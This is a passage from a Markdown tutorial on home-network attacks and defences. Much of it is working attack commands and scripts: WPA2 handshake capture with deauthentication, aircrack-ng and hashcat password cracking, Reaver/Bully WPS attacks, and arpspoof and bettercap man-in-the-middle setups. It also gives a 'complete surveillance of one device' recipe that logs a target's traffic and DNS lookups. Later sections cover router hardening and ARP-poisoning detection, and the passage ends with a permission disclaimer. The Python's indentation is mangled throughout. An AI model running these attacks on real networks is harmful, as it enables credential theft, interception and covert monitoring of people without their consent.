																							if src != device_ip and dst != device_ip:
																								continue
																								
																								# Track connections
																								if src == device_ip:  # Outbound traffic
																									key = dst
																									connections[key]['bytes'] += len(pkt)
																									connections[key]['packets'] += 1
																									
																									# DNS queries
																									if pkt.haslayer('DNS') and pkt.haslayer('DNSQR'):
																										if src == device_ip:
																											domain = pkt['DNSQR'].qname.decode().rstrip('.')
																											dns_queries.append(domain)
																											
																											# HTTP requests
																											if pkt.haslayer('Raw') and src == device_ip:
																												data = bytes(pkt['Raw']).decode('utf-8', errors='ignore')
																												if data.startswith('GET') or data.startswith('POST'):
																													lines = data.split('\r\n')
																													http_requests.append(lines[0])  # Request line
																													
																													print(f"\n=== DEVICE ANALYSIS: {device_ip} ===")
																													
																													print(f"\n[TOP CONNECTIONS]")
																													top_connections = sorted(connections.items(),
																																			 key=lambda x: x[1]['bytes'],
													  reverse=True)[:15]
													  for ip, stats in top_connections:
														  try:
														  hostname = socket.gethostbyaddr(ip)[0]
														  except:
														  hostname = ip
														  
														  print(f"  {ip:<16} {hostname:<40} "
														  f"{stats['bytes']:>10} bytes  "
														  f"{stats['packets']:>5} pkts")
														  
														  print(f"\n[DNS QUERIES] (unique domains)")
														  for domain in sorted(set(dns_queries)):
															  print(f"  {domain}")
															  
															  print(f"\n[HTTP REQUESTS]")
															  for req in http_requests[:20]:
																  print(f"  {req}")
																  
																  print(f"\n[SUMMARY]")
																  print(f"  Total external IPs contacted: {len(connections)}")
																  print(f"  Total DNS queries: {len(dns_queries)}")
																  print(f"  Unique domains: {len(set(dns_queries))}")
																  
																  # Usage
																  analyze_device_traffic('/tmp/device_traffic.pcap', '192.168.1.105')
																  ```
																  
																  ### Real-Time Traffic Dashboard
																  
																  ```python
																  # live_dashboard.py — Real-time traffic monitor
																  from scapy.all import *
																  from collections import defaultdict
																  import time
																  import os
																  
																  class NetworkDashboard:
																  def __init__(self, interface="eth0"):
																  self.interface = interface
																  self.device_traffic = defaultdict(lambda: {
																	  'bytes_in': 0, 'bytes_out': 0,
																	  'packets': 0, 'domains': set(),
																									'last_seen': 0
																  })
																  
																  def process_packet(self, pkt):
																  if 'IP' not in pkt:
																	  return
																	  
																	  src = pkt['IP'].src
																	  dst = pkt['IP'].dst
																	  size = len(pkt)
																	  
																	  # Skip our own IP and broadcast
																	  my_ips = ['192.168.1.200']  # Your machine's IP
																	  if src in my_ips:
																		  return
																		  
																		  # Track outbound traffic
																		  if src.startswith('192.168.'):  # Local source
																			  self.device_traffic[src]['bytes_out'] += size
																			  self.device_traffic[src]['packets'] += 1
																			  self.device_traffic[src]['last_seen'] = time.time()
																			  
																			  # Track DNS queries
																			  if pkt.haslayer('DNSQR'):
																				  domain = pkt['DNSQR'].qname.decode().rstrip('.')
																				  self.device_traffic[src]['domains'].add(domain)
																				  
																				  def print_dashboard(self):
																				  os.system('clear')
																				  print("=" * 70)
																				  print("REAL-TIME NETWORK MONITOR")
																				  print("=" * 70)
																				  print(f"{'IP':<18} {'Out (KB)':<12} {'Packets':<10} {'Domains':<8}")
																				  print("-" * 70)
																				  
																				  active = {ip: d for ip, d in self.device_traffic.items()
																					  if time.time() - d['last_seen'] < 30}  # Active in last 30s
																						  
																						  for ip, data in sorted(active.items()):
																							  domains = len(data['domains'])
																							  kb_out = data['bytes_out'] / 1024
																							  print(f"{ip:<18} {kb_out:<12.1f} {data['packets']:<10} {domains:<8}")
																							  
																							  # Show recent domains
																							  recent_domains = list(data['domains'])[-3:]
																							  for d in recent_domains:
																								  print(f"  {'':16} → {d}")
																								  
																								  print(f"\nActive devices: {len(active)}")
																								  print("Press Ctrl+C to stop")
																								  
																								  def run(self):
																								  print("[*] Starting live network monitor...")
																								  print("[*] Make sure ARP poisoning is running!")
																								  
																								  import threading
																								  
																								  def update_display():
																								  while True:
																									  self.print_dashboard()
																									  time.sleep(2)
																									  
																									  t = threading.Thread(target=update_display, daemon=True)
																									  t.start()
																									  
																									  sniff(iface=self.interface,
																											prn=self.process_packet,
								 store=0)
																									  
																									  dashboard = NetworkDashboard("eth0")
																									  dashboard.run()
																									  ```
																									  
																									  ---
																									  
																									  ## 11. WiFi Security Analysis
																									  
																									  ### Scan for Nearby Networks
																									  
																									  ```bash
																									  # Passive scan (just listen)
																									  sudo airodump-ng wlan0mon
																									  
																									  # Output columns explained:
																									  # BSSID    = Router's MAC address
																									  # PWR      = Signal strength (negative, closer to 0 = stronger)
																									  # Beacons  = Broadcast packets count
																									  # #Data    = Data packets (more = more active)
																									  # CH       = WiFi channel
																									  # MB       = Max speed (54e = 54 Mbps)
																									  # ENC      = Encryption: OPN, WEP, WPA, WPA2, WPA3
																									  # CIPHER   = CCMP (strong) or TKIP (weaker)
																									  # AUTH     = PSK (password) or MGT (enterprise)
																									  # ESSID    = Network name
																									  
																									  # Target a specific network for detailed scan
																									  sudo airodump-ng -c [CHANNEL] --bssid [AP_MAC] wlan0mon
																									  
																									  # Example:
																									  sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
																									  
																									  # This shows:
																									  # - The AP's details
																									  # - ALL connected client devices with their MACs
																									  ```
																									  
																									  ### Check Network Security
																									  
																									  ```bash
																									  # What security issues to look for:
																									  
																									  # 1. Open networks (ENC = OPN)
																									  # → No encryption! All traffic visible to anyone
																									  sudo airodump-ng wlan0mon | grep OPN
																									  
																									  # 2. WEP encryption (obsolete, crackable in minutes)
																									  sudo airodump-ng wlan0mon | grep WEP
																									  
																									  # 3. WPS enabled (can be brute forced)
																									  sudo wash -i wlan0mon
																									  # Shows: BSSID, Channel, WPS Version, WPS Locked, ESSID
																									  # "WPS Locked: No" = vulnerable to Pixie Dust/brute force
																									  
																									  # 4. Check for management frame protection
																									  # Networks without PMF (Protected Management Frames)
																									  # are vulnerable to deauthentication attacks
																									  
																									  # 5. Check for hidden SSIDs
																									  sudo airodump-ng wlan0mon | grep "\\x00"
																									  # Hidden SSIDs show as <length: X> — send probe to reveal them
																									  ```
																									  
																									  ---
																									  
																									  ## 12. WPA2 Handshake Capture
																									  
																									  ### How WPA2 Authentication Works
																									  
																									  ```
																									  When a device connects to WiFi:
																									  
																									  Device → AP: "I want to connect"
																									  AP → Device: "Here's a random challenge (ANonce)"
																									  Device → AP: "Here's my challenge (SNonce) + MIC"
																									  (MIC = message integrity code, derived from password)
																									  AP → Device: "Here's my MIC"
																									  
																									  The 4 messages = "4-Way Handshake"
																									  
																									  Key insight: The MIC is calculated using the WiFi password.
																									  If we capture the handshake, we can try passwords offline:
																									  "Would password 'hello123' produce this MIC? No.
																									  Would 'mypassword'? Yes! Found it!"
																									  ```
																									  
																									  ### Capturing the Handshake
																									  
																									  ```bash
																									  # Step 1: Find target network
																									  sudo airodump-ng wlan0mon
																									  # Note: BSSID (MAC), Channel, ESSID of target
																									  
																									  # Step 2: Focus on target network
																									  sudo airodump-ng -c 6 \
																									  --bssid AA:BB:CC:DD:EE:FF \
																									  -w /tmp/handshake \
																									  wlan0mon
																									  
																									  # Wait for a client to naturally connect
																									  # OR speed it up with deauthentication:
																									  
																									  # Step 3: Force client to reconnect (sends deauth frames)
																									  # Open new terminal:
																									  sudo aireplay-ng -0 5 \
																									  -a AA:BB:CC:DD:EE:FF \  # AP MAC
																									  -c CC:DD:EE:FF:00:11 \  # Client MAC
																									  wlan0mon
																									  
																									  # -0 5 = send 5 deauth packets
																									  # Client disconnects and immediately reconnects = handshake captured!
																									  
																									  # Step 4: Verify handshake was captured
																									  # airodump-ng window shows: "WPA handshake: AA:BB:CC:DD:EE:FF"
																									  # or use:
																									  aircrack-ng /tmp/handshake-01.cap
																									  # If it shows "1 handshake" → success!
																									  ```
																									  
																									  ### Cracking the Handshake
																									  
																									  ```bash
																									  # Method 1: Dictionary attack with aircrack-ng
																									  aircrack-ng -w /usr/share/wordlists/rockyou.txt \
																									  -b AA:BB:CC:DD:EE:FF \
																									  /tmp/handshake-01.cap
																									  
																									  # Output:
																									  # KEY FOUND! [ password123 ]
																									  # or: "Passphrase not in dictionary"
																									  
																									  # Method 2: Hashcat (much faster, uses GPU)
																									  # First convert to hashcat format:
																									  hcxtools -o handshake.hc22000 /tmp/handshake-01.cap
																									  
																									  # Then crack:
																									  hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt
																									  
																									  # Method 3: Rule-based attack (try variations)
																									  hashcat -m 22000 handshake.hc22000 /usr/share/wordlists/rockyou.txt \
																									  -r /usr/share/hashcat/rules/best64.rule
																									  
																									  # Method 4: Brute force (for short passwords)
																									  hashcat -m 22000 handshake.hc22000 -a 3 ?d?d?d?d?d?d?d?d
																									  # ?d = digit, 8 digits = tries all 8-digit number passwords
																									  
																									  # Masks:
																									  # ?l = lowercase letter
																									  # ?u = uppercase letter
																									  # ?d = digit
																									  # ?s = special character
																									  # ?a = all of the above
																									  
																									  # Common password patterns:
																									  hashcat -m 22000 handshake.hc22000 -a 3 ?u?l?l?l?l?l?d?d?d
																									  # Uppercase + 5 lowercase + 3 digits = "Hello123"
																									  ```
																									  
																									  ### Pixie Dust Attack (WPS)
																									  
																									  ```bash
																									  # If WPS is enabled and not locked:
																									  sudo apt install reaver bully
																									  
																									  # Pixie Dust (very fast, works on many routers)
																									  sudo reaver -i wlan0mon \
																									  -b AA:BB:CC:DD:EE:FF \
																									  -K 1 \    # Pixie Dust mode
																									  -vvv      # Verbose
																									  
																									  # Standard WPS brute force (slow, 4-10 hours)
																									  sudo reaver -i wlan0mon \
																									  -b AA:BB:CC:DD:EE:FF \
																									  -vvv
																									  
																									  # Or with bully:
																									  sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
																									  ```
																									  
																									  ---
																									  
																									  ## 13. Monitoring Specific Devices
																									  
																									  ### Track a Device's Complete Activity
																									  
																									  ```bash
																									  # Complete surveillance of one device:
																									  TARGET_IP="192.168.1.105"
																									  GATEWAY_IP="192.168.1.1"
																									  INTERFACE="eth0"
																									  
																									  # Enable forwarding
																									  echo 1 > /proc/sys/net/ipv4/ip_forward
																									  
																									  # ARP poison
																									  sudo arpspoof -i $INTERFACE -t $TARGET_IP $GATEWAY_IP &
																									  sudo arpspoof -i $INTERFACE -t $GATEWAY_IP $TARGET_IP &
																									  
																									  # Capture traffic
																									  sudo tcpdump -i $INTERFACE host $TARGET_IP \
																									  -w /tmp/target_$(date +%Y%m%d_%H%M%S).pcap &
																									  
																									  # Show real-time domains visited
																									  sudo tcpdump -i $INTERFACE -n host $TARGET_IP and udp port 53 2>/dev/null | \
																									  grep -o '[A-Za-z0-9][A-Za-z0-9\-]*\.[A-Za-z0-9][A-Za-z0-9\-]*\.[a-z]*' | \
																									  while read domain; do
																										  echo "[$(date +%H:%M:%S)] DNS: $domain"
																										  done
																										  ```
																										  
																										  ### Monitor All DNS Queries (See Every Domain Visited)
																										  
																										  ```python
																										  # dns_monitor.py — See every domain every device looks up
																										  from scapy.all import *
																										  from datetime import datetime
																										  from collections import defaultdict
																										  
																										  device_domains = defaultdict(list)
																										  
																										  def log_dns(pkt):
																										  if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
																											  if pkt[DNS].qr == 0:  # Query (not response)
																												  src_ip = pkt[IP].src
																												  domain = pkt[DNSQR].qname.decode().rstrip('.')
																												  timestamp = datetime.now().strftime('%H:%M:%S')
																												  
																												  # Skip system/infrastructure domains
																												  skip = ['local', 'arpa', 'broadcasthost', 'wpad']
																												  if any(domain.endswith(s) for s in skip):
																													  return
																													  
																													  device_domains[src_ip].append(domain)
																													  
																													  print(f"[{timestamp}] {src_ip:<16} → {domain}")
																													  
																													  # Alert on suspicious domains
																													  suspicious = ['porn', 'torrent', 'crack', 'hack',
	 'malware', 'phish', 'evil']
	 if any(s in domain.lower() for s in suspicious):
		 print(f"  ⚠ SUSPICIOUS DOMAIN: {domain}")
		 
		 print("[*] DNS Monitor running - see every domain every device visits")
		 print("[*] (Requires ARP poisoning to be active)")
		 print()
		 sniff(iface="eth0",
			   filter="udp port 53",
		 prn=log_dns,
		 store=0)
		 ```
		 
		 ### Build a Parental Control System
		 
		 ```python
		 # parental_control.py
		 from scapy.all import *
		 
		 # Domains to block
		 BLOCKED_DOMAINS = [
			 'gambling-site.com',
	 'adult-site.com',
	 'social-media.com',  # Example blocks
		 ]
		 
		 BLOCKED_CATEGORIES = [
			 'porn', 'xxx', 'adult', 'sex',
	 'torrent', 'pirate',
	 'gambling', 'casino',
		 ]
		 
		 def block_dns(pkt):
		 if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
			 domain = pkt[DNSQR].qname.decode().rstrip('.')
			 
			 # Check if blocked
			 is_blocked = False
			 
			 if any(domain == b or domain.endswith('.' + b)
				 for b in BLOCKED_DOMAINS):
					 is_blocked = True
					 
					 if any(cat in domain.lower()
						 for cat in BLOCKED_CATEGORIES):
							 is_blocked = True
							 
							 if is_blocked:
								 print(f"[BLOCKED] {pkt[IP].src} → {domain}")
								 
								 # Send NXDOMAIN response (domain not found)
								 response = (
									 IP(dst=pkt[IP].src, src=pkt[IP].dst) /
									 UDP(dport=pkt[UDP].sport, sport=53) /
									 DNS(
										 id=pkt[DNS].id,
			  qr=1,
			  rcode=3,      # NXDOMAIN = domain doesn't exist
			  qd=pkt[DNS].qd
									 )
								 )
								 send(response, verbose=False)
								 return "BLOCKED"
								 
								 sniff(iface="eth0",
									   filter="udp port 53",
			   prn=block_dns,
			   store=0)
								 ```
								 
								 ---
								 
								 ## 14. Building a Full Network Monitor
								 
								 ### Complete Home Network Security Monitor
								 
								 ```python
								 # home_network_monitor.py
								 # Run this 24/7 to monitor everything on your network
								 
								 from scapy.all import *
								 from collections import defaultdict
								 import json
								 import time
								 import threading
								 import smtplib
								 from datetime import datetime
								 
								 class HomeNetworkMonitor:
								 
								 def __init__(self, interface="eth0", network="192.168.1.0/24"):
								 self.interface = interface
								 self.network = network
								 self.known_devices = {}       # MAC → device info
								 self.traffic_log = defaultdict(list)
								 self.alerts = []
								 self.running = True
								 
								 # Load known devices (whitelist)
								 self.load_known_devices()
								 
								 def load_known_devices(self):
								 """Load your known devices"""
								 # Populate this with your devices!
								 self.known_devices = {
									 'AA:BB:CC:DD:EE:FF': {'name': 'My Phone', 'owner': 'Me'},
	 '11:22:33:44:55:66': {'name': 'Laptop', 'owner': 'Me'},
	 '22:33:44:55:66:77': {'name': 'Smart TV', 'owner': 'Living Room'},
	 'AA:BB:CC:DD:00:11': {'name': 'Router', 'owner': 'Network'},
								 }
								 
								 def scan_network(self):
								 """Periodically scan for new devices"""
								 while self.running:
									 try:
									 ans = srp(
										 Ether(dst="ff:ff:ff:ff:ff:ff") /
										 ARP(pdst=self.network),
											   timeout=2,
					verbose=False
									 )[0]
									 
									 for _, rcv in ans:
										 mac = rcv[Ether].src.upper()
										 ip = rcv[ARP].psrc
										 
										 if mac not in self.known_devices:
											 self.alert(f"UNKNOWN DEVICE! IP: {ip}, MAC: {mac}")
											 
											 except Exception as e:
											 pass
											 
											 time.sleep(60)  # Scan every minute
											 
											 def process_packet(self, pkt):
											 """Process each captured packet"""
											 if 'IP' not in pkt:
												 return
												 
												 src_ip = pkt['IP'].src
												 dst_ip = pkt['IP'].dst
												 
												 # Log DNS queries
												 if pkt.haslayer('DNS') and pkt.haslayer('DNSQR'):
													 if pkt['DNS'].qr == 0:
														 domain = pkt['DNSQR'].qname.decode().rstrip('.')
														 self.log_dns(src_ip, domain)
														 
														 # Detect port scans
														 if pkt.haslayer('TCP'):
															 if pkt['TCP'].flags == 0x002:  # SYN only
																 self.detect_port_scan(src_ip, dst_ip, pkt['TCP'].dport)
																 
																 # Detect large data transfers (possible exfiltration)
																 if len(pkt) > 1400:  # Large packet
																	 if not dst_ip.startswith('192.168.'):  # Going outside
																		 self.traffic_log[src_ip].append({
																			 'time': time.time(),
																										 'dst': dst_ip,
																										 'size': len(pkt)
																		 })
																		 
																		 def log_dns(self, src_ip, domain):
																		 """Log and analyze DNS queries"""
																		 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
																		 
																		 # Log to file
																		 with open('/tmp/dns_log.txt', 'a') as f:
																		 f.write(f"{timestamp} | {src_ip} | {domain}\n")
																		 
																		 # Alert on suspicious domains
																		 suspicious_keywords = [
																			 'malware', 'botnet', 'c2', 'command',
	 'payload', 'shell', 'backdoor'
																		 ]
																		 if any(kw in domain.lower() for kw in suspicious_keywords):
																			 self.alert(f"SUSPICIOUS DNS: {src_ip} queried {domain}")
																			 
																			 def detect_port_scan(self, src_ip, dst_ip, dst_port):
																			 """Detect if a device is port scanning"""
																			 key = f"{src_ip}_scan"
																			 if not hasattr(self, '_scan_tracker'):
																				 self._scan_tracker = defaultdict(list)
																				 
																				 self._scan_tracker[src_ip].append(dst_port)
																				 
																				 # If device hit 10+ different ports in 5 seconds → port scan
																				 recent = [t for t in self._scan_tracker[src_ip]
																				 if time.time() - t < 5] if isinstance(
																					 self._scan_tracker[src_ip][0], float
																				 ) else self._scan_tracker[src_ip][-10:]
																				 
																				 if len(set(recent)) > 10:
																					 self.alert(f"PORT SCAN DETECTED from {src_ip}!")
																					 
																					 def alert(self, message):
																					 """Send alert"""
																					 timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
																					 alert_msg = f"[{timestamp}] ALERT: {message}"
																					 print(f"\n{'='*50}")
																					 print(alert_msg)
																					 print('='*50)
																					 
																					 self.alerts.append(alert_msg)
																					 
																					 # Log to file
																					 with open('/tmp/security_alerts.txt', 'a') as f:
																					 f.write(alert_msg + '\n')
																					 
																					 def start(self):
																					 """Start all monitoring"""
																					 print("[*] Home Network Monitor starting...")
																					 
																					 # Start device scanning in background
																					 scan_thread = threading.Thread(target=self.scan_network)
																					 scan_thread.daemon = True
																					 scan_thread.start()
																					 
																					 print(f"[*] Sniffing on {self.interface}")
																					 print("[*] Monitoring: DNS queries, new devices, port scans")
																					 print("[*] Logs: /tmp/dns_log.txt, /tmp/security_alerts.txt")
																					 
																					 sniff(iface=self.interface,
																						   prn=self.process_packet,
							store=0)
																					 
																					 monitor = HomeNetworkMonitor(interface="eth0")
																					 monitor.start()
																					 ```
																					 
																					 ---
																					 
																					 ## 15. Defending Your Network
																					 
																					 Now that you understand attacks, secure yourself:
																					 
																					 ### Router Security
																					 
																					 ```
																					 1. Change default router password
																					 admin:admin → strong random password
																					 
																					 2. Update router firmware
																					 Admin panel → Firmware Update → Check for updates
																					 
																					 3. Disable WPS
																					 Admin panel → Wireless → WPS → Disable
																					 
																					 4. Use WPA3 if supported
																					 Or WPA2 with CCMP (not TKIP)
																					 
																					 5. Disable remote management
																					 Admin panel → Remote Management → Disable
																					 
																					 6. Enable firewall
																					 Admin panel → Security → Firewall → Enable
																					 
																					 7. Check connected devices regularly
																					 Admin panel → DHCP Clients list
																					 Remove unknown devices
																					 
																					 8. Use guest network for IoT devices
																					 Keep IoT devices isolated from main network
																					 ```
																					 
																					 ### Detect ARP Poisoning
																					 
																					 ```bash
																					 # Check your ARP table for suspicious entries
																					 arp -a
																					 # Look for: same MAC address assigned to multiple IPs
																					 # That means someone is ARP poisoning!
																					 
																					 # Example of poisoned ARP table:
																					 # router.local (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether]
																					 # laptop.local (192.168.1.105) at aa:bb:cc:dd:ee:ff [ether]
																					 # ← Both have SAME MAC! Someone is doing MITM!
																					 
																					 # Monitor ARP table for changes
																					 watch -n 2 arp -a
																					 
																					 # Or use XArp (GUI tool for Windows/Linux)
																					 sudo apt install xarp
																					 sudo xarp
																					 ```
																					 
																					 ### Prevent ARP Poisoning
																					 
																					 ```bash
																					 # Set static ARP entries (can't be overwritten)
																					 sudo arp -s 192.168.1.1 AA:BB:CC:DD:EE:FF
																					 
																					 # But this doesn't survive reboot
																					 # For permanent static ARP on Linux:
																					 # Add to /etc/network/interfaces or use arptables
																					 
																					 # Use arptables to only accept ARP from router
																					 sudo apt install arptables
																					 sudo arptables -A INPUT --source-mac AA:BB:CC:DD:EE:FF -j ACCEPT
																					 sudo arptables -A INPUT -j DROP
																					 
																					 # Enterprise solution: Dynamic ARP Inspection (DAI)
																					 # Available on managed switches
																					 ```
																					 
																					 ### Detect Someone Sniffing Your Network
																					 
																					 ```python
																					 # detect_sniffer.py — Find sniffers on your network
																					 from scapy.all import *
																					 
																					 def detect_promiscuous_mode():
																					 """
																					 Devices in promiscuous/monitor mode respond to
																					 packets sent to non-existent MAC addresses.
																					 Normal devices ignore these packets.
																					 """
																					 
																					 # Send packet to fake MAC address
																					 fake_mac = "ff:ff:ff:ff:ff:fe"  # Not real broadcast
																					 test_packet = Ether(dst=fake_mac) / IP(dst="192.168.1.255") / \
																					 ICMP()
																					 
																					 # If anyone responds, they're in promiscuous mode (sniffing!)
																					 print("[*] Scanning for devices in promiscuous/monitor mode...")
																					 answers = srp(test_packet, timeout=2, verbose=False)[0]
																					 
																					 if answers:
																						 print("[!] Possible sniffers detected:")
																						 for _, ans in answers:
																							 print(f"    {ans[IP].src} ({ans[Ether].src})")
																							 else:
																								 print("[+] No obvious sniffers detected")
																								 
																								 detect_promiscuous_mode()
																								 ```
																								 
																								 ### Use HTTPS Everywhere
																								 
																								 ```
																								 Install HTTPS Everywhere browser extension
																								 Or use a browser that enforces HTTPS by default (Firefox, Chrome)
																								 
																								 This prevents SSL stripping attacks because:
																								 - Your browser refuses HTTP connections to known HTTPS sites
																								 - HSTS preload list contains major websites
																								 ```
																								 
																								 ---
																								 
																								 ## 16. Tools Reference
																								 
																								 ### Complete Tool List
																								 
																								 | Tool | Use | Install |
																								 |---|---|---|
																								 | **aircrack-ng suite** | WiFi analysis, WPA cracking | `apt install aircrack-ng` |
																								 | **bettercap** | MITM framework | `apt install bettercap` |
																								 | **Wireshark** | Packet analysis GUI | `apt install wireshark` |
																								 | **tcpdump** | Packet capture CLI | `apt install tcpdump` |
																								 | **nmap** | Network scanning | `apt install nmap` |
																								 | **arpspoof** | ARP poisoning | `apt install dsniff` |
																								 | **mitmproxy** | HTTP/HTTPS proxy | `pip install mitmproxy` |
																								 | **sslstrip** | SSL stripping | `apt install sslstrip` |
																								 | **netdiscover** | Device discovery | `apt install netdiscover` |
																								 | **reaver** | WPS attacks | `apt install reaver` |
																								 | **hashcat** | Password cracking | `apt install hashcat` |
																								 | **scapy** | Python packet library | `pip install scapy` |
																								 | **dnsspoof** | DNS spoofing | `apt install dsniff` |
																								 | **ettercap** | Classic MITM tool | `apt install ettercap-text-only` |
																								 
																								 ### One-Command Setup
																								 
																								 ```bash
																								 # Install everything you need
																								 sudo apt update && sudo apt install -y \
																								 aircrack-ng bettercap wireshark tshark \
																								 tcpdump nmap dsniff mitmproxy sslstrip \
																								 netdiscover reaver hashcat ettercap-text-only \
																								 arp-scan arptables python3-scapy \
																								 net-tools iw wireless-tools
																								 
																								 pip3 install scapy mitmproxy requests
																								 ```
																								 
																								 ---
																								 
																								 ## Quick Reference Cheatsheet
																								 
																								 ### Network Discovery
																								 ```bash
																								 sudo nmap -sn 192.168.1.0/24          # Find all devices
																								 sudo netdiscover -i eth0               # ARP-based discovery
																								 sudo arp-scan --localnet               # Fast ARP scan
																								 arp -a                                 # Show ARP table
																								 ```
																								 
																								 ### WiFi Recon
																								 ```bash
																								 sudo airmon-ng start wlan0             # Monitor mode
																								 sudo airodump-ng wlan0mon              # Scan networks
																								 sudo airodump-ng -c 6 --bssid MAC wlan0mon  # Target network
																								 sudo airmon-ng stop wlan0mon           # Stop monitor mode
																								 ```
																								 
																								 ### ARP Poisoning
																								 ```bash
																								 echo 1 > /proc/sys/net/ipv4/ip_forward     # Enable forwarding
																								 sudo arpspoof -i eth0 -t TARGET GATEWAY    # Poison target
																								 sudo arpspoof -i eth0 -t GATEWAY TARGET    # Poison gateway
																								 ```
																								 
																								 ### Traffic Capture
																								 ```bash
																								 sudo tcpdump -i eth0 host TARGET -w cap.pcap    # Capture device
																								 sudo tcpdump -i eth0 -A port 80                 # HTTP content
																								 wireshark cap.pcap                              # Analyze
																								 ```
																								 
																								 ### Bettercap Quick MITM
																								 ```bash
																								 sudo bettercap -iface eth0
																								 # Inside bettercap:
																								 # net.probe on
																								 # set arp.spoof.targets 192.168.1.105
																								 # arp.spoof on
																								 # net.sniff on
																								 ```
																								 
																								 ---
																								 
																								 *Remember: Only use these techniques on networks you own or have explicit permission to test.*
																								 *Understanding attacks is the foundation of building strong defenses.*
